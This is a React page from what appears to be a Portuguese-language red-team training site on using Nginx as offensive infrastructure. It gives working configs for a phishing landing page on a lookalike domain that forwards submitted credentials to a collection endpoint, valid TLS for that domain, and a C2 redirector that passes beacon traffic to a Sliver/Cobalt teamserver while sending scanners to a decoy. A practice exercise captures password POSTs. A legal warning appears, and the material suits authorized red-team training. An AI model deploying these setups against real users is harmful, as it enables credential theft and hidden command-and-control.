import { PageContainer } from "@/components/layout/PageContainer";
import { AlertBox } from "@/components/ui/AlertBox";
import { CodeBlock } from "@/components/ui/CodeBlock";
import { CommandTable } from "@/components/ui/CommandTable";
import { PracticeBox } from "@/components/ui/PracticeBox";
import { Terminal } from "@/components/ui/Terminal";

export default function Nginx() {
  return (
    <PageContainer
      title="Nginx — servidor + redirector ofensivo"
      subtitle="Hospede landing de phishing, proxy reverso para C2, redirector com filtragem por User-Agent. Tudo com TLS válido."
      difficulty="intermediario"
      timeToRead="20 min"
    >
      <h2>Por que Nginx no Kali ofensivo</h2>
      <p>
        Nginx é leve, async, lê HTTP/2 e HTTP/3 (QUIC). Em Red Team ele se torna
        peça-chave de <strong>infra ofensiva</strong>: redireciona o callback
        legítimo do beacon para o teamserver e devolve 404/decoy para qualquer
        outro request — incluindo as varreduras do blue team. Pra phishing,
        hospeda um clone perfeito da página alvo com cert válido.
      </p>

      <Terminal
        path="~"
        lines={[
          {
            cmd: "sudo apt install -y nginx",
            out: `Setting up nginx-common (1.26.0-3) ...
Setting up nginx (1.26.0-3) ...
Created symlink /etc/systemd/system/multi-user.target.wants/nginx.service → /usr/lib/systemd/system/nginx.service.`,
            outType: "info",
          },
          {
            cmd: "sudo systemctl status nginx --no-pager -l | head -8",
            out: `● nginx.service - A high performance web server and a reverse proxy server
     Loaded: loaded (/usr/lib/systemd/system/nginx.service; enabled; preset: enabled)
     Active: active (running) since Fri 2026-04-03 16:01:42 -0300; 4s ago
   Main PID: 23847 (nginx)
      Tasks: 9 (limit: 9418)
     Memory: 12.4M
     CGroup: /system.slice/nginx.service
             ├─23847 "nginx: master process /usr/sbin/nginx -g daemon on; master_process on;"`,
            outType: "success",
          },
          {
            cmd: "curl -s -o /dev/null -w '%{http_code}\\n' http://localhost",
            out: "200",
            outType: "success",
          },
        ]}
      />

      <h2>Estrutura no Debian/Kali</h2>
      <CommandTable
        title="caminhos importantes"
        variations={[
          { cmd: "/etc/nginx/nginx.conf", desc: "Config principal — define worker_processes, includes.", output: "Inclui /etc/nginx/conf.d/*.conf e /etc/nginx/sites-enabled/*." },
          { cmd: "/etc/nginx/sites-available/", desc: "Onde VOCÊ cria os server blocks.", output: "Arquivos por site." },
          { cmd: "/etc/nginx/sites-enabled/", desc: "Symlinks dos sites ativos.", output: "ln -s ../sites-available/meu-site ." },
          { cmd: "/etc/nginx/conf.d/", desc: "Configs globais .conf (cache, gzip, log_format).", output: "Carregado automático." },
          { cmd: "/etc/nginx/snippets/", desc: "Pedaços reutilizáveis (ssl-params, fastcgi).", output: "include snippets/ssl-params.conf;" },
          { cmd: "/var/log/nginx/access.log", desc: "Cada request loggado.", output: "Use pra ver quem bateu no redirector." },
          { cmd: "/var/log/nginx/error.log", desc: "Erros de config + upstream timeouts.", output: "Primeiro lugar pra ver quando algo quebra." },
          { cmd: "/var/www/html/", desc: "Document root padrão do site default.", output: "Onde o 'Welcome to nginx!' mora." },
        ]}
      />

      <h2>Comandos essenciais</h2>
      <Terminal
        path="~"
        lines={[
          {
            comment: "ANTES de reload, sempre teste a config",
            cmd: "sudo nginx -t",
            out: `nginx: the configuration file /etc/nginx/nginx.conf syntax is ok
nginx: configuration file /etc/nginx/nginx.conf test is successful`,
            outType: "success",
          },
          {
            comment: "reload sem matar conexões ativas",
            cmd: "sudo systemctl reload nginx",
            out: "(silencioso)",
            outType: "muted",
          },
          {
            comment: "restart total",
            cmd: "sudo systemctl restart nginx",
            out: "(silencioso)",
            outType: "muted",
          },
          {
            comment: "ver versão e módulos compilados",
            cmd: "nginx -V 2>&1 | tr ' ' '\\n' | grep -E '^--with|version' | head -10",
            out: `nginx version: nginx/1.26.0
--with-cc-opt=...
--with-http_ssl_module
--with-http_realip_module
--with-http_v2_module
--with-http_stub_status_module
--with-stream
--with-stream_ssl_module
--with-stream_realip_module`,
            outType: "info",
          },
        ]}
      />

      <h2>Server block básico — landing de phishing</h2>
      <CodeBlock
        language="nginx"
        title="/etc/nginx/sites-available/login-corp"
        code={`server {
    listen 80;
    server_name login-corporativo.com www.login-corporativo.com;

    root /var/www/login-corp;
    index index.html;

    access_log /var/log/nginx/login-corp.access.log;
    error_log  /var/log/nginx/login-corp.error.log;

    location / {
        try_files $uri $uri/ =404;
    }

    # captura POST do form e envia pra um endpoint de coleta
    location = /collect {
        proxy_pass http://127.0.0.1:8000/collect;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header User-Agent $http_user_agent;
    }
}`}
      />

      <Terminal
        path="~"
        lines={[
          {
            cmd: "sudo ln -s /etc/nginx/sites-available/login-corp /etc/nginx/sites-enabled/",
            out: "(silencioso)",
            outType: "muted",
          },
          {
            cmd: "sudo nginx -t && sudo systemctl reload nginx",
            out: `nginx: the configuration file /etc/nginx/nginx.conf syntax is ok
nginx: configuration file /etc/nginx/nginx.conf test is successful`,
            outType: "success",
          },
        ]}
      />

      <AlertBox type="danger" title="Phishing exige autorização escrita">
        <p>
          Hospedar página falsa de credenciais sem escopo formal é crime
          (Lei 12.737, art. 154-A). Use APENAS em engajamentos com{" "}
          <strong>Rules of Engagement</strong> assinadas e domínios próprios.
          Modelos educacionais cá apresentados.
        </p>
      </AlertBox>

      <h2>TLS válido com Certbot (Let's Encrypt)</h2>
      <Terminal
        path="~"
        lines={[
          {
            cmd: "sudo apt install -y certbot python3-certbot-nginx",
            out: "(instala)",
            outType: "muted",
          },
          {
            comment: "domínio precisa apontar pro IP do servidor (DNS A record)",
            cmd: "sudo certbot --nginx -d login-corporativo.com -d www.login-corporativo.com -m operador@redteam.local --agree-tos -n --redirect",
            out: `Successfully received certificate.
Certificate is saved at: /etc/letsencrypt/live/login-corporativo.com/fullchain.pem
Key is saved at:         /etc/letsencrypt/live/login-corporativo.com/privkey.pem
This certificate expires on 2026-07-02.
Successful redirect from HTTP to HTTPS for login-corporativo.com`,
            outType: "success",
          },
          {
            cmd: "sudo systemctl list-timers | grep certbot",
            out: "Mon 2026-04-07 09:31:42 UTC certbot.timer certbot.service",
            outType: "info",
          },
        ]}
      />

      <h2>Reverse proxy + redirector C2</h2>
      <p>
        O redirector fica entre o beacon (na vítima) e o teamserver. Tráfego{" "}
        <strong>legítimo</strong> (User-Agent / URI / cookie do beacon) vai pro
        C2; tráfego <strong>suspeito</strong> (curl, nmap, scanners blue) vai
        pra um decoy.
      </p>

      <CodeBlock
        language="nginx"
        title="/etc/nginx/sites-available/redirector"
        code={`# Mapa que decide pra onde mandar baseado no User-Agent
map $http_user_agent $is_legit_beacon {
    default                                            0;
    "~*Mozilla/5\\.0 \\(Windows NT 10\\.0; Win64; x64\\) MeuBeaconUA/1\\.0"   1;
}

# Upstream do teamserver (Sliver/Cobalt) só acessível por loopback
upstream c2_team {
    server 127.0.0.1:9443;
    keepalive 16;
}

server {
    listen 443 ssl http2;
    server_name cdn.empresa-fake.com;

    ssl_certificate     /etc/letsencrypt/live/cdn.empresa-fake.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/cdn.empresa-fake.com/privkey.pem;
    include snippets/ssl-params.conf;

    access_log /var/log/nginx/redirector.access.log combined;

    # Endpoint que o beacon usa
    location ~ ^/api/v1/(checkin|task|result)$ {
        if ($is_legit_beacon = 0) {
            return 302 https://www.empresa-real.com/;
        }
        proxy_pass         https://c2_team;
        proxy_ssl_verify   off;
        proxy_set_header   Host $host;
        proxy_set_header   X-Real-IP $remote_addr;
        proxy_http_version 1.1;
        proxy_set_header   Connection "";
    }

    # Tudo MAIS vai pra um decoy (página corporativa fake ou real)
    location / {
        return 302 https://www.empresa-real.com/;
    }
}`}
      />

      <h2>Snippet TLS endurecido</h2>
      <CodeBlock
        language="nginx"
        title="/etc/nginx/snippets/ssl-params.conf"
        code={`ssl_protocols TLSv1.2 TLSv1.3;
ssl_prefer_server_ciphers on;
ssl_ciphers ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305;
ssl_session_cache shared:SSL:10m;
ssl_session_timeout 1h;
ssl_session_tickets off;
ssl_stapling on;
ssl_stapling_verify on;
add_header Strict-Transport-Security "max-age=63072000" always;
add_header X-Frame-Options DENY;
add_header X-Content-Type-Options nosniff;`}
      />

      <h2>php-fpm + Nginx (webshell educacional)</h2>
      <CodeBlock
        language="nginx"
        title="server block PHP via php-fpm"
        code={`server {
    listen 80;
    server_name lab.local;
    root /var/www/lab;
    index index.php index.html;

    location / {
        try_files $uri $uri/ /index.php?$query_string;
    }

    location ~ \\.php$ {
        include snippets/fastcgi-php.conf;
        fastcgi_pass unix:/run/php/php8.3-fpm.sock;
        fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
    }

    # bloqueia acesso a .htaccess, .git, .env
    location ~ /\\.(?!well-known) {
        deny all;
    }
}`}
      />

      <h2>Logs em tempo real</h2>
      <Terminal
        path="~"
        lines={[
          {
            cmd: "sudo tail -f /var/log/nginx/redirector.access.log",
            out: `192.168.10.55 - - [03/Apr/2026:16:42:11 -0300] "GET /api/v1/checkin HTTP/1.1" 200 312 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) MeuBeaconUA/1.0"
185.220.101.32 - - [03/Apr/2026:16:42:33 -0300] "GET / HTTP/1.1" 302 0 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
198.235.24.10 - - [03/Apr/2026:16:43:01 -0300] "GET /admin HTTP/1.1" 302 0 "-" "Mozilla/5.0 zgrab/0.x"`,
            outType: "info",
          },
          {
            comment: "extrai só callbacks legítimos",
            cmd: "sudo grep 'MeuBeaconUA' /var/log/nginx/redirector.access.log | awk '{print $1}' | sort -u",
            out: `192.168.10.55
192.168.10.78`,
            outType: "success",
          },
        ]}
      />

      <h2>Performance & limits úteis</h2>
      <CommandTable
        title="diretivas que importam"
        variations={[
          { cmd: "worker_processes auto;", desc: "Auto = 1 worker por core CPU.", output: "Em /etc/nginx/nginx.conf no top-level." },
          { cmd: "worker_connections 4096;", desc: "Conexões simultâneas POR worker.", output: "Dentro de events { }." },
          { cmd: "client_max_body_size 100M;", desc: "Aumenta limite de upload (default 1M = pequeno demais p/ exfil).", output: "" },
          { cmd: "limit_req zone=login burst=5 nodelay;", desc: "Rate-limit (anti-bruteforce ou anti-detect).", output: "Defina zone com limit_req_zone." },
          { cmd: "real_ip_header X-Forwarded-For;", desc: "Quando atrás de Cloudflare/load balancer.", output: "Loga o IP real, não o do proxy." },
          { cmd: "proxy_read_timeout 300s;", desc: "Útil pra long-polling de C2.", output: "" },
          { cmd: "gzip on; gzip_types text/plain ...", desc: "Compressão (cuidado: BREACH/CRIME em endpoints com cookie).", output: "" },
          { cmd: "return 444;", desc: "Fecha conexão SEM resposta — bom contra bots.", output: "Fingerprint anti-scanner." },
        ]}
      />

      <PracticeBox
        title="Suba uma landing 'login' e capture POST"
        goal="Hospedar um HTML mínimo com form, e ver o POST chegar nos logs do nginx via netcat backend."
        steps={[
          "Crie /var/www/lab/index.html com form action=/collect.",
          "Suba um listener netcat na 8000 que retorna 200 OK.",
          "Configure server block do nginx com proxy_pass para 127.0.0.1:8000.",
          "Faça curl POST e veja o que chega no nc.",
        ]}
        command={`sudo mkdir -p /var/www/lab
echo '<form method=POST action=/collect><input name=user><input name=pass type=password><button>OK</button></form>' | sudo tee /var/www/lab/index.html

sudo tee /etc/nginx/sites-available/lab >/dev/null <<'EOF'
server {
  listen 80;
  server_name lab.local;
  root /var/www/lab;
  location / { try_files $uri $uri/ =404; }
  location = /collect {
    proxy_pass http://127.0.0.1:8000/;
    proxy_set_header X-Real-IP $remote_addr;
  }
}
EOF
sudo ln -sf /etc/nginx/sites-available/lab /etc/nginx/sites-enabled/lab
sudo nginx -t && sudo systemctl reload nginx

# em outro terminal: nc -lvnp 8000
curl -X POST -d 'user=admin&pass=Senha@123' -H 'Host: lab.local' http://127.0.0.1/collect`}
        expected={`Connection received from 127.0.0.1:43122
POST / HTTP/1.0
Host: 127.0.0.1:8000
X-Real-IP: 127.0.0.1
Content-Length: 24

user=admin&pass=Senha@123`}
        verify="O nc capturou o POST com as credenciais. Em prod-phishing isso vai pra um endpoint Flask que persiste em DB."
      />

      <AlertBox type="info" title="ngx_brotli e HTTP/3">
        <p>
          Para compressão moderna instale <code>libnginx-mod-http-brotli-filter</code>{" "}
          e adicione <code>brotli on;</code>. Para HTTP/3 (QUIC) o Kali já vem
          com nginx 1.26 que tem <code>--with-http_v3_module</code> compilado:
          basta <code>listen 443 quic reuseport;</code> + cert.
        </p>
      </AlertBox>
    </PageContainer>
  );
}
